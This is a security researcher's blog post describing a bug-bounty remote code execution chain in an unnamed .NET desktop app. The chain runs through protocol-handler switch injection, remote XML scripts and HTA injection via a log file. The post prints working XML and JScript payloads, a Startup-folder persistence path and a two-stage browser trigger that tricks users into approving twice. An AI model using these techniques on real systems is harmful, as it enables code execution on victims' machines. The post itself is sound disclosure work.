---
title: "Attack Surface Analysis - Part 3 - Resurrected Code Execution"
date: 2021-09-26T20:50:38-07:00
draft: false
toc: true
comments: true
twitterImage: 01-hta-with-calc.png
categories:
- Attack Surface Analysis
---

In part 3 of my attack surface analysis series, I will discuss an undisclosed RCE.
This bug uses a combination of all tricks introduced in
{{< xref path="/post/2021/2021-03-17-attack-surface-analysis-2-custom-uri/"
    text="part 2 of the series" title="Attack Surface Analysis - Part 2 - Custom Protocol Handlers" >}}.

We will see command-line switch injection from a custom protocol handler,
loading remote files, reversing a custom scripting engine to instrument the
application, and log file injection. Pretty nice chain if I may say so.

<!--more-->

**Previously on Attack Surface Analysis**

* {{< xref path="/post/2021/2021-01-08-electron-sig-bypass/" text="Attack Surface Analysis - Part 1 - Application Update: 'A Novel Way to Bypass Executable Signature Checks with Electron" >}}
* {{< xref path="/post/2021/2021-03-17-attack-surface-analysis-2-custom-uri/" text="Attack Surface Analysis - Part 2 - Custom Protocol Handlers" >}}

# Summary
We can abuse two similar command-line switches. Each has two parameters. One is
an XML file that is a script for the app's internal instrumentation engine
(e.g., make the app do things like click buttons) and the second one is an
output file that stores the result script's execution.

I found a command named `BrowserOpen` in the instrumentation engine that takes a
URI and runs it with `Process.Start(string)`. This allows us to run any local
executable but without parameters. The instrumentation engine can pop calc if it
runs this script.

```xml
<MyRoot>
    <BrowserOpen URI="C:/Windows/System32/calc.exe" />
</MyRoot>
```

We can abuse get some limited remote code execution in the application because
of the following:

* The application registers a custom protocol handler. We can pass any
  switch/parameters to the application.
* The script file can be remote (it's the same for log files but that is not
  useful here).

I filed two bugs (one for each switch), I could pass a remote file and run an
executable without any parameters. Neither was accepted because of this
limitation and I almost gave up.

While reading the part 2 of this series, I remembered that if the script
contains an error, the output file has the complete line that has caused the
error.

This enabled me to use the technique in the Google Web Designer log injection
bug to write an HTA to the victim's file system at a location of my choice.
Then, I could abuse the same functionality to execute the HTA with a separate
protocol handler invocation.

Thus, the RCE was resurrected.

# Introduction
In December 2020 and January 2021, I spent around 100 hours on a program with a
.NET thickclient. Programs usually do not have desktop applications in scope so
it was a welcome surprise. I ended up submitting five bugs for a total of $8500
(not my greatest payday but a good for roughly 100 hours of hunting). Some
limited info:

* [Bug #1 - 2K][bug1]: This was out of scope but I explained how this is an issue and
  they gave me a bounty.
* [Bug #2 - 2K][bug2]: I literally asked the security team what they cared about and
  then went and found it. Open communication helps.
* [Bug #3 - 1.5K][bug3]: I found the WSDL and it had an API call to create admin users.
  Normal users could call it.
* [Bug #4 - 1.5K][bug4]: Similar to the above, I proxied the thickclient and found I
  could call APIs that I should not.
* Bug #5 - 1.5K : This one.

[bug1]: https://twitter.com/CryptoGangsta/status/1367762486934446083
[bug2]: https://twitter.com/CryptoGangsta/status/1362799006514966530
[bug3]: https://twitter.com/CryptoGangsta/status/1359058979033284608
[bug4]: https://twitter.com/CryptoGangsta/status/1352818412213309441

## Some History
I found two remote code execution bugs in the program. Both were rejected (we
will see later why). Initially, I started the previous installment of this
series to explain [these useless RCEs][useless-rce-twitter] but, the blog turned
into a long review.

[useless-rce-twitter]: https://twitter.com/CryptoGangsta/status/1369844949651361794

I read about the
{{< xref path="/post/2021/2021-03-17-attack-surface-analysis-2-custom-uri/"
    text="Google Web Designer Command Injection via The Log File"
    anchor="google-web-designer-command-injection-via-the-log-file" >}}
bug and realized I can use it to resurrect this bug. This blog will explain
how I found this bug, what techniques I used (spoiler: pretty much everything
from part 2), why it was initially rejected, and how I resurrected it.

# The Original Bug
Without further ado, let's talk about what I initially found.

## Protocol Handlers
The program installs four custom protocol handlers. This was
obvious because the application launched its tutorial with a URI immediately
after installation. E.g., `appHandler://-showTutorial [GUID]`.

Using [URLProtocolView][urlprotocolview-nirsoft] by Nirsoft I looked at the
command-line for the handlers:

* `C:\Program Files\company\app\app.exe %L`

[urlprotocolview-nirsoft]: https://www.nirsoft.net/utils/url_protocol_view.html

`%L` is not a common switch. It means "long file name form of the first
parameter." Think of it as "a long string that is passed to the app." I am not
sure how it is different from `%1`.

Note the URI handler is not quoted. It doesn't matter here. The app parses the
URI and extracts the switches:

1. Click `bleh://-switch1 value1 -switch2 value2` in the browser.
2. App is executed as `app.exe bleh://-switch1 value1 -switch2 value2`.
3. App extracts the switches and runs as `app.exe -switch1 value1 -switch2 value2`.

## Command-Line Switches
If we find a vulnerable command-line switch in such an app, we can launch a
remote attack using the protocol handler.

Running the app with some dummy switches (e.g., `app.exe --whatever`) displayed
a usage dialog with a list of switches. I realized the app has hidden switches
that are not shown because this list did not include the `showTutorial` switch
that I had seen before.

Fortunately, this was a .NET app. I started debugging it with dnSpy. The main
binary and some DLLs were obfuscated but I was looking for specific strings.
While debugging, I saw the app compares switches from input against a list of
valid ones.

{{< blockquote author="Parsia" source="Self quote (lol)" >}}
Every computer science problem can be reduced to string comparison.
{{< /blockquote >}}

This was done in `System.Core.dll > namespace System.Linq`. By putting a
breakpoint in the following function, I could see every valid switch in the
value of `source`:

```cs
public static TSource FirstOrDefault<TSource>(this IEnumerable<TSource> source, Func<TSource, bool> predicate)
{
    if (source == null)
    {
        throw Error.ArgumentNull("source");
    }
    if (predicate == null)
    {
        throw Error.ArgumentNull("predicate");
    }
    foreach (TSource tsource in source)
    {
        if (predicate(tsource)) // BREAKPOINT HERE!!!
        {
            return tsource;
        }
    }
    return default(TSource);
}
```

The app had 55 switches and the usage string only showed 30. In such situations,
you need to carefully examine each "hidden switch" because they might do
something naughty. I discovered three that were promising. One was used to
[bypass a client-side protection][bug1] (not related to this bug). The other
two resulted in this RCE. They look like this (obviously fake names):

* `-script scriptSource.xml output.xml`
* `-debug  scriptSource.xml output.xml server username password`

They both do the same thing:

1. `debug` tries to log in to the `server` with `username:password`.
2. Both, process and run `scriptSource.xml`.
3. Both, store the output of the script in `output.xml`. E.g., a success message
   or errors if any.

## Login
`debug` tries to log in to the server before doing anything. If it is not
successful, the script is not executed. I realized the app does not really do
anything after sending the login request and thinks it has logged in after
receiving some canned responses. I set up a local Python3 server to simulate a
login and the app was tricked into thinking it has completed the login sequence.
We can create our own dummy server and pass it in the parameters to make this
work.

After the login, both switches are the same so I will use `-script` for the rest
of the post.

## Output File
This output file is really useful. It contains the result of the script's execution. E.g., if I passed an empty file like
`app.exe -script empty.xml output.txt`, I would get this helpful error in
`output.txt`:

```cs
Script Failed:
  System.Xml.XmlException: Root element is missing.
   at System.Xml.XmlTextReaderImpl.Throw(Exception e)
   at System.Xml.XmlTextReaderImpl.ParseDocumentContent()
   at System.Xml.Linq.XDocument.Load(XmlReader reader, LoadOptions options)
   at System.Xml.Linq.XDocument.Load(String uri, LoadOptions options)
   at [redacted]

Current Step:
    Unknown
```

This means the script needs to be an XML file. Although, we already knew that
from the usage string for this switch (the extension of the file was `xml` in
the example).

## Loading Remote Files
I wanted to see if the app accepts UNC paths. I passed a non-existing UNC path
to it and saw this error in the output file that confirmed my theory:

```cs
System.IO.IOException: The network path was not found.
  at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
  at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access,
    Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize,
    FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath,
    Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
  at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share)
  at [redacted]
```
Both files for these two switches can be remote.

## Custom Script
The `scriptSource` file is passed to the custom scripting engine of the
application. We can use this to instrument the application. That is how the
app's tutorial walks the users through a simple workflow. We can use it to
perform actions in the application (e.g., click buttons). I passed a dummy XML
file to see how it behaves (mainly to see the error in the output file).

```xml
<Root>
    <child />
</Root>
```

And I got this error:

```cs
Script Failed:
    System.InvalidOperationException: Unknown tag: Root
   at [redacted]

Current Step:
    Unknown
```

This stack trace pointed me to the location where the app was checking the root
tag. I put a breakpoint in the chain and debugged the app with dnSpy, I was able
to find the expected name of the root tag (remember what I said about reducing
every problem to string comparison?). Let's call the root tag `MyRoot`.

```cs
private void runCommands(XDocument nfc)
{
    // Code Removed
    // Check if the root tag is named "MyRoot"
    if (nfc.Root.Name.ToString() != "MyRoot)
    {
        // If not, return an error.
        XName name = nfc.Root.Name;
        throw new InvalidOperationException(...);
    }
    // If the root tag is MyRoot, continue.
    foreach (XElement xelement in nfc.Root.Elements())
    {
        // parse each child tag

        // a very long switch/case structure that compares the name of each
        // child tag with the command names.
```

Turns out the format of the XML file is very simple. Each command is a separate child of the root tag. Something like this:

```xml
<MyRoot>
    <Cmd1 />
    <Cmd2 />
</MyRoot>
```

Discovering the name of the commands (e.g., `Cmd1`) was another string
comparison problem. I already knew where the root tag was compared so I could
continue debugging from that point. The engine had 22 possible commands.

I realized the scripting engine is used to instrument the app without user
interaction. For example, there was a command named `TutorialButtonClick`.

## BrowserOpen
I went through all the commands but most resulted in a crash. Until I got to
`BrowserOpen` (fake name again). The following code executes this tag. It checks
if the tag has a URI attribute. If so, it's converted to a URI and passed to the
`Runtime.Instance.Open` method:

```cs
// The original code was obfuscated so I renamed some variables to make it easier to read.
private void runBrowserOpen(XElement command)
{
    // Get the value of the "URI" attribute.
    tempURI = command.GetAttribute("URI");
    // If the value of the "URI" is not null, do the following.
    if (tempURI != null)
    {
        Runtime.Instance.Open(new Uri(attribute));
    }
}
```

So our XML should look like this:

```xml
<MyRoot>
    <BrowserOpen URI="something" />
</MyRoot>
```

The input must satisfy the `Uri(input)` constructor. If there is an error,
execution is stopped and the app prints a stack trace and error line to the
output file.

The `Open` method does this.

```cs
public virtual void Open(Uri uri)
{
    try
    {
        OpenFileOrUrl(uri);
    }
    catch (Exception ex)
    {
        // Handle the exception.
    }
}
```

`OpenFileOrUrl` (below) is straightforward and has a programming bug (see if you
can spot it). If the platform is not Windows, it calls
`Process.Start("open", URI)`. I am not sure if this line is also vulnerable to
command injection or not. The app is only available on Windows so I did not look
into it.

On Windows, the app first checks if the incoming URI has the `http` or `https`
scheme with `IsPathForBrowser`. If not, it calls `Process.Start(URI)`.

```cs
private void OpenFileOrUrl(string pathOrUri)
{
    if (Runtime.IsOSPlatform(OSPlatform.Windows))
    {
        try
        {
            // This checks if the scheme is http or https.
            if (!IsPathForBrowser(pathOrUri))
            {
                Process.Start(pathOrUri);
                return;
            }
        }
        catch (Exception exception)
        {
            // Handle exception
        }
        // This is executed if the scheme is http or https. E.g., if we pass a URL.
        // This will open the URL in the system's default browser.
        Process.Start("explorer.exe", pathOrUri.SurroundedInQuotes());
        return;
    }
    // If the OS is not Windows, run this one.
    Process.Start("open", pathOrUri);
}
```

If this call raises an exception (e.g., if the file does not exist) we get a
second chance. The app runs `explorer.exe "URI"`. This is the
programming bug, the exception handler should return and not give us this extra
try. Depending on the payload, `explorer.exe` does something. E.g.,
`explore.exe https://example.net` opens the website in the default browser.

### Popping Calc
We can do command injection here without any parameters. I have created a REPL at
[https://dotnetfiddle.net/o1mCnT][repl-url] if you want to see the
transformation.

```cs
using System;
                    
public class Program
{
    public static void Main()
    {
        Uri baseUri = new Uri("C:/Windows/System32/calc.exe");
        Console.WriteLine(baseUri.ToString());
    }
}
```

[repl-url]: https://dotnetfiddle.net/o1mCnT

This is the main constraint. The string must get converted to a [Uri][uri-docs].
More, this is the [overload with only one parameter][uri-constructor]. The
second parameter is `dontEscape`, deprecated and set to `false` by default.

[uri-constructor]: https://docs.microsoft.com/en-us/dotnet/api/system.uri.-ctor#System_Uri__ctor_System_String_
[uri-docs]: https://docs.microsoft.com/en-us/dotnet/api/system.uri

We do not need to use the `file:///` scheme for local files. We can use the
[Implicit File Path Support][uri-file-path-support] and skip it. This is not
part of the URI specification and it does not matter here (we can pass any
scheme) but, it's a good point to remember in case you see something in the
future. This means all of the following are converted to
`file:///C:/Windows/System32/calc.exe`.

```
C:/Windows/System32/calc.exe
file:C:/Windows/System32/calc.exe
file:/C:/Windows/System32/calc.exe
file://C:/Windows/System32/calc.exe
```
[uri-file-path-support]: https://docs.microsoft.com/en-us/dotnet/api/system.uri?view=net-5.0#implicit-file-path-support

This script will pop calc (we can replace it with any other local executable).

```xml
<MyRoot>
    <BrowserOpen URI="C:/Windows/System32/calc.exe" />
</MyRoot>
```

# RCE: Rejected Code Execution
So far we know we can:

1. Pass command-line switches to the app from the browser.
2. Use a script file to run calc or any other local executable.
3. Pass remote scripts via UNC paths to the app.

This means we can get some code execution.

1. Create a script file like the one above in a remote share (e.g., `\\IP`).
2. Run the app from the browser with these parameters:
    1. `appHandler://-script \\IP\popcalc.xml \\IP\output.txt`
3. User clicks on the link in the browser and allows the app to run.
4. App runs calc.

I have documented how I created a
{{< xref path="/post/2021/2021-05-31-remote-file-share/index.markdown"
    text="public remote file share in the cloud" >}}
to host the remote script. It lets you host files at `\\IP\path\to\file`
using a static IP in an Amazon EC2 machine for less than 5 USD a month.

I submitted this bug but it was rejected because 
**I could run any local executable but couldn't pass parameters**. We cannot
execute remote files by using UNC paths, either. I could also pass schemes like
`ms-calculator://` (pops calc) but I could not find any scheme in Windows that
let me execute an arbitrary command and pass parameters (that would be a pretty
nasty Windows 0day).
~~I will write a separate blog post about my adventures there.~~
I have some drafts that need more research to become a blog post.

Here's a small console program if you want to experiment. Pass what you want as
the first argument and see what you can execute.

* [https://gist.github.com/parsiya/f235882ed04c4f881064a12dc7b6be15][rce-gist]

[rce-gist]: https://gist.github.com/parsiya/f235882ed04c4f881064a12dc7b6be15

## TavisO's Similar Bug
At this point, I was trying to [figure out how to bypass this][helpme-interwebz].
I even asked [TavisO][taviso-twitter] about
[https://bugs.chromium.org/p/project-zero/issues/detail?id=693][bug-693]. He
answered within hours. Thanks, mate.

His bug is about a [localghost server][localghost-youtube]. TrendMicro's
Password Manager had a local node.js server that was vulnerable to remote code
execution. Websites could talk to the local server and run local executables
like this:

* `https://localhost:49155/api/openUrlInDefaultBrowser?url=c:/windows/system32/calc.exe`

[taviso-twitter]: https://twitter.com/taviso
[bug-693]: https://bugs.chromium.org/p/project-zero/issues/detail?id=693
[helpme-interwebz]: https://twitter.com/CryptoGangsta/status/1354612042200608768
[localghost-youtube]: https://youtu.be/Cgl51ZcACLg?t=90

The `openUrlInDefaultBrowser` API is almost the exact replica of what we are
working with here. We can pass local files but no parameters.

# RCE: Resurrected Code Execution
While writing part two I was fascinated by the
{{< xref path="/post/2021/2021-03-17-attack-surface-analysis-2-custom-uri/"
    anchor="google-web-designer-command-injection-via-the-log-file"
    title="Google Web Designer Command Injection via The Log File"
    text="Google Web Designer bug" >}}
rgod could inject text into a log file at a chosen local path. They injected
JScript into an HTA in the administrator's startup directory and got remote
code execution.

My spidey senses started tingling. I could do the same. Let's review the
vulnerable command-line switches:

* `-script scriptSource.xml output.xml`
* `-debug  scriptSource.xml output.xml server username password`

So far, we have only looked at the script file. The second parameter is
`output.xml`. This is just a normal text file and can be a local path that we
can choose. It stores the output of the script. Let's see what we can inject in
it. I passed an XML file with the correct root tag but a script tag from rgod's
proof-of-concept:

```xml
<MyRoot>
    <script>var x=new ActiveXObject("WScript.Shell");x.Exec("calc.exe");</script>
</MyRoot>
```

And then run the app:

* `appHandler://-script resurrected-test-injection.xml resurrected-test-output.hta`

The output file contains the stack trace and the
**exact line with the error as-is**. BINGO!!1!!

```cs
Script Failed:
    System.InvalidOperationException: Unknown tag: script
   at [redacted]

Current Step:
    <script>var x=new ActiveXObject("WScript.Shell");x.Exec("calc.exe");</script>
```

The application does not recognize the `script` tag (it's not one of the
commands) and helpfully prints the complete line with the error. If I double
click the HTA file that I just injected then calc starts.

{{< imgcap title="Injected HTA executed" src="01-hta-with-calc.png" >}}

**A huge advantage of this method over the previous is being able to pass
parameters**. E.g., the following is a very convoluted way of showing a
second command prompt that does not close after execution. I actually spent an
hour trying to make this happen (lol):

`x.Exec("cmd.exe /k start cmd.exe /k echo 'hello world'")`.

## Exploitation
We can use rgod's method. They injected the HTA into the
administrator's startup directory. I could do something similar with:

```
appHandler://-script resurrected-test-injection.xml
  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/injected.hta
```

This has some limitations. We need to know the username of the target or the
user must be local admin (not necessarily the `Administrator` user because other
local admins can write to that path, too).

I tried using the `%username%` environment variable and passed
`C:/Users/%username%/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/injected.hta`
for the output file but the app did not resolve the environment variable. It did
not work here but might work in another app so it's good to know.

{{< imgcap title="Environment variable error" src="02-env-var-error.png" >}}

I felt like I had a good proof-of-concept but, I wanted to do more. I can
execute single binaries on the file system, why not inject the HTA in one
command then execute it with another? Something like:

`appHandler://-script \\IP\resurrected-exploit-1.xml C:/ProgramData/app/inject.hta`

Where `resurrected-exploit-1.xml` is:

```xml
<MyRoot>
    <script>var x=new ActiveXObject("WScript.Shell");x.Exec("calc.exe");</script>
    <BrowserOpen URI="C:/ProgramData/app/inject.hta">
</MyRoot>
```

The first line injects the HTA and the second line exploits it, pretty nifty,
eh? WELL, one big issue. The execution is stopped after the first error. The HTA
is written to the file system but the `BrowserOpen` line is never executed :(

What if we invoke the app twice on the same web page? Instead of having two
commands in one script we can have two different scripts (one injects and the
second executes).

`appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta`

The script just injects the HTA:

```xml
<MyRoot>
    <script>var x=new ActiveXObject("WScript.Shell");x.Exec("calc.exe");</script>
</MyRoot>
```

The second execution runs the injected HTA.

`appHandler://-script \\IP\run-HTA.xml \\IP\did-it-execute.txt`

The script executes the injected HTA and writes the output to our shared server
(optional).

```xml
<MyRoot>
    <BrowserOpen URI="C:/ProgramData/app/inject.hta">
</MyRoot>
```

We can do this on one HTML page with JavaScript. Assigning the protocol handler
URI to `window.location` is the same as clicking it.

```
1. window.location=String.raw`appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta`
2. User needs to click allow. The app runs. HTA is injected.
3. Wait 10 seconds and then show an alert popup.
4. window.location=String.raw`appHandler://-script \\IP\run-HTA.xml \\IP\did-it-execute.txt`
5. User clicks allow. The app runs. HTA is executed
6. ???
7. Profit
```

The user needs to click `Allow` to run the app twice but chances are the user
will think the app did not launch properly. We can show an alert box after the
execution to claim the execution was not successful and we will try again to
trick the user into doing it again.

## User Gesture Required
This also has the advantage of bypassing Chromium "user gesture required"
errors. In short, after the first protocol handler, the user must do something
other than clicking allow otherwise, the second protocol handler does not
start and we see this error in the console
`Not allowed to launch 'appHandler://blah' because a user gesture is required.`

[Alesandro][alesandro-twitter] was kind enough to explain it to me
on [Twitter (expand the whole thread)][gesture-twitter].

[alesandro-twitter]: https://twitter.com/AlesandroOrtizR
[gesture-twitter]: https://twitter.com/CryptoGangsta/status/1377716233705955330

# What Did We Learn Here Today?

1. Read other people's bugs. It seems like everything I do is essentially a mix
   of public bugs.
2. User gesture stuff in Chromium.
3. [Implicit File Path Support][uri-file-path-support] which allows us not to
   include the `file:///` scheme and let the library transform it to the local
   path.
4. `%username%` and `%appdata%` environment variables are useful if your app
   resolves them.
